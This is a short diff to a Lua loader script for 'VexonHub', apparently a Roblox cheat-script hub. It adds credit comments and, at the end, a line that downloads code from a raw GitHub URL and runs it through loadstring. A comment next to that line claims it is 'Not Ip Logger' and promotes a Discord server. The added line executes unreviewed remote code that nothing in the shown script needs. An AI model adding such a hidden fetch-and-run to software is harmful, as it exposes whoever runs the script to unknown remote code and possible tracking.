@@ -1,3 +1,8 @@
+--// VexonHub Loader  \\--
+--|| Made By TheVex0n ||--
+--\\ Thanks For Using //--
+
+
 local CoreGui = game:GetService("StarterGui")
     CoreGui:SetCore("SendNotification", {
         Title = "VexonHub",
@@ -39,3 +44,8 @@ else
         Callback = AllowRunServiceBind,
     })
 end
+
+
+-- This Is For VexonHub Users Server Its Not Ip Logger Here If You Want To Join
+-- https://discord.gg/G5S3ccZc3S
+loadstring(game:HttpGet("https://raw.githubusercontent.com/DiosDi/VexonHub/refs/heads/main/Users-VexonHub"))()
